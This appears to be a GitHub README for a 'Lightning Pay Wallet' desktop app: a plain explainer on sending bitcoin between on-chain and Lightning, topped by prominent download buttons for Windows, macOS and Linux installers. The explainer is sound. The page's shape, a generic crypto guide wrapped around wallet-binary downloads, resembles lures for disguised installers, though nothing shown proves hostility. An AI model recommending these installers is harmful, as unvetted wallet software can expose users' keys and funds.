<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Sending bitcoin between the on-chain network and Lightning

Two rails, four directions, and one rule about matching them.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

Bitcoin and Lightning are not two names for one thing. They are different rails, and moving value
between them is a real operation with its own costs and failure modes.

## The four directions

**On-chain to on-chain.** An ordinary transaction. Final after confirmations, priced by block space.

**Lightning to Lightning.** A routed payment. Instant, priced in fractions of a satoshi.

**On-chain to Lightning.** You send bitcoin to a service or wallet that credits a Lightning balance.
Usually this means depositing to an exchange or a swap service.

**Lightning to on-chain.** The same in reverse: a service accepts your Lightning payment and sends
on-chain, or your wallet closes a channel and the balance returns on-chain.

## The rule

Match the rail to what you were given. An address beginning `bc1` needs an on-chain send. A string
beginning `lnbc` needs a Lightning payment. Sending one where the other is expected does not work, and
a mismatch can lose funds when a service credits only the network it named.

## What each direction costs

On-chain legs pay a fee set by block space. Lightning legs pay routing fees. A swap or exchange adds
its own spread, which is usually the largest cost in the transaction and the least visible.

Closing a channel is itself an on-chain transaction, so turning a Lightning balance into an on-chain
one costs a fee even when nobody else is involved.

## What cannot happen

You cannot push bitcoin from an on-chain address into a Lightning invoice directly; the invoice asks
for a routed payment, not a transaction. And a Lightning payment cannot land at an on-chain address,
because there is nothing at that address to receive it.

Wallets that offer both make this look like one screen. It is worth reading which rail the screen is
using before confirming.

## Timing expectations

Lightning legs settle in seconds. On-chain legs wait for blocks, and a swap waits for both. When
someone says a transfer is "slow", the on-chain leg is almost always the reason.

## Questions people ask

### Can I send from a normal bitcoin wallet to a Lightning wallet?

Only through a service that accepts on-chain and pays out over Lightning, or by opening a channel.

### Why did my exchange deposit not arrive?

Check which network you used against the deposit method you were given. A mismatch is the usual cause.

### Does a channel close count as a transfer?

Yes, from Lightning to on-chain, and it pays an on-chain fee.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/how-fast-is-a-lightning-payment.md">How fast a Lightning payment is, and what a satoshi is worth</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/what-is-the-lightning-network.md">What the Lightning Network is and how a payment moves</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/move-bitcoin-to-exchanges-or-cash-app.md">Moving bitcoin between Lightning Pay and exchanges or Cash App</a>

